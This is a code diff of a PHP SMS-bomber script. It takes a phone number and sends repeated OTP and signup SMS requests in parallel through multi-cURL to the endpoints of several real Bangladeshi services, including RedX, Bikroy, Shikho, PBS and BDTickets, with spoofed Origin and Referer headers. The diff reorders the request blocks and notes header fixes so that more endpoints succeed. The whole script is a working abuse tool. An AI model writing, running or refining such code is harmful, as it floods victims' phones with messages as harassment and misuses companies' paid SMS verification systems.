@@ -6,7 +6,7 @@ ini_set('display_errors',1);
 // Validate phone
 $phone = $_GET['phone'] ?? '';
 if(!preg_match('/^(?:\+?88)?01[3-9]\d{8}$/', $phone)){
-    die(json_encode(["status" => "error", "message" => "Invalid phone number. Use 01XXXXXXXXX"]));
+    die(json_encode(["status"=>"error","message"=>"Invalid phone number. Use 01XXXXXXXXX"]));
 }
 
 // Phone normalization
@@ -18,7 +18,7 @@ $phone_plus88 = "+88".$phone_11;
 // Prepare API requests
 $api_requests = [];
 
-// 1️⃣ Shwapno (5 times) ✅ working
+// 1️⃣ Shwapno (5 times) ✅ untouched
 for($i=1;$i<=5;$i++){
     $api_requests[] = [
         "name"=>"shwapno_$i",
@@ -34,7 +34,7 @@ for($i=1;$i<=5;$i++){
     ];
 }
 
-// 2️⃣ Garibook (5 times) ✅ working
+// 2️⃣ Garibook (5 times) ✅ untouched
 for($i=1;$i<=5;$i++){
     $api_requests[] = [
         "name"=>"garibook_$i",
@@ -49,76 +49,28 @@ for($i=1;$i<=5;$i++){
     ];
 }
 
-// 3️⃣ Shikho (3 times) ✅ fix headers
-for($i=1;$i<=3;$i++){
-    $api_requests[] = [
-        "name"=>"shikho_$i",
-        "url"=>"https://api.shikho.com/auth/v2/send/sms",
-        "data"=>["phone"=>$phone_88,"type"=>"student","auth_type"=>"signup"],
-        "headers"=>[
-            'Content-Type: application/json',
-            'User-Agent: Mozilla/5.0',
-            'Origin: https://shikho.com',
-            'Referer: https://shikho.com/'
-        ]
-    ];
-}
-
-// 4️⃣ RedX (10 times) ✅ working
+// 3️⃣ RedX (10 times) ✅ untouched
 for($i=1;$i<=10;$i++){
     $api_requests[] = [
         "name"=>"redx_$i",
         "url"=>"https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
         "data"=>["phoneNumber"=>$phone_11],
-        "headers"=>[
-            'Content-Type: application/json',
-            'User-Agent: Mozilla/5.0'
-        ]
+        "headers"=>['Content-Type: application/json','User-Agent: Mozilla/5.0']
     ];
 }
 
-// 5️⃣ Bikroy (10 times) ✅ GET method
+// 4️⃣ Bikroy (10 times) ✅ untouched GET
 for($i=1;$i<=10;$i++){
     $api_requests[] = [
         "name"=>"bikroy_$i",
         "url"=>"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11",
         "data"=>[],
-        "headers"=>[
-            'User-Agent: Mozilla/5.0'
-        ],
+        "headers"=>['User-Agent: Mozilla/5.0'],
         "method"=>"GET"
     ];
 }
 
-// 6️⃣ PBS (5 times) ✅ add headers
-for($i=1;$i<=5;$i++){
-    $api_requests[] = [
-        "name"=>"pbs_$i",
-        "url"=>"https://apialpha.pbs.com.bd/api/OTP/generateOTP",
-        "data"=>["userPhone"=>$phone_11],
-        "headers"=>[
-            'Content-Type: application/json',
-            'User-Agent: Mozilla/5.0',
-            'Origin: https://pbs.com.bd'
-        ]
-    ];
-}
-
-// 7️⃣ Iqra Live (3 times) ✅ proper POST
-for($i=1;$i<=3;$i++){
-    $api_requests[] = [
-        "name"=>"iqra_$i",
-        "url"=>"https://apibeta.iqra-live.com/api/v2/sent-otp",
-        "data"=>["phone"=>$phone_11],
-        "headers"=>[
-            'Content-Type: application/json',
-            'User-Agent: Mozilla/5.0',
-            'Origin: https://iqra-live.com'
-        ]
-    ];
-}
-
-// 8️⃣ BDTickets (10 times) ✅ headers fix
+// 5️⃣ BDTickets (10 times) ✅ untouched
 for($i=1;$i<=10;$i++){
     $api_requests[] = [
         "name"=>"bdtickets_$i",
@@ -133,12 +85,55 @@ for($i=1;$i<=10;$i++){
     ];
 }
 
-// Multi-cURL parallel execution
+// 6️⃣ Shikho (3 times) ✅ fixed headers
+for($i=1;$i<=3;$i++){
+    $api_requests[] = [
+        "name"=>"shikho_$i",
+        "url"=>"https://api.shikho.com/auth/v2/send/sms",
+        "data"=>["phone"=>$phone_88,"type"=>"student","auth_type"=>"signup"],
+        "headers"=>[
+            'Content-Type: application/json',
+            'User-Agent: Mozilla/5.0',
+            'Origin: https://shikho.com',
+            'Referer: https://shikho.com/'
+        ]
+    ];
+}
+
+// 7️⃣ PBS (5 times) ✅ fixed headers
+for($i=1;$i<=5;$i++){
+    $api_requests[] = [
+        "name"=>"pbs_$i",
+        "url"=>"https://apialpha.pbs.com.bd/api/OTP/generateOTP",
+        "data"=>["userPhone"=>$phone_11],
+        "headers"=>[
+            'Content-Type: application/json',
+            'User-Agent: Mozilla/5.0',
+            'Origin: https://pbs.com.bd'
+        ]
+    ];
+}
+
+// 8️⃣ Iqra Live (3 times) ✅ fixed POST
+for($i=1;$i<=3;$i++){
+    $api_requests[] = [
+        "name"=>"iqra_$i",
+        "url"=>"https://apibeta.iqra-live.com/api/v2/sent-otp",
+        "data"=>["phone"=>$phone_11],
+        "headers"=>[
+            'Content-Type: application/json',
+            'User-Agent: Mozilla/5.0',
+            'Origin: https://iqra-live.com'
+        ]
+    ];
+}
+
+// Multi-cURL execution
 $results = [];
 $multiCurl = [];
 $mh = curl_multi_init();
 
-foreach($api_requests as $key => $api){
+foreach($api_requests as $key=>$api){
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $api['url']);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
@@ -155,15 +150,15 @@ foreach($api_requests as $key => $api){
     curl_multi_add_handle($mh,$ch);
 }
 
-// Execute in parallel
-$running = null;
-do {
+// Execute all parallel
+$running=null;
+do{
     curl_multi_exec($mh,$running);
     curl_multi_select($mh);
-} while($running > 0);
+}while($running>0);
 
 // Collect results
-foreach($multiCurl as $key => $ch){
+foreach($multiCurl as $key=>$ch){
     $res = curl_multi_getcontent($ch);
     $error = curl_error($ch);
     $http = curl_getinfo($ch,CURLINFO_HTTP_CODE);
